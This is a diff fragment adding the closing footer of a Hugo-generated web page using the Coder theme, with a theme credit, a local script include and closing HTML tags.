+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
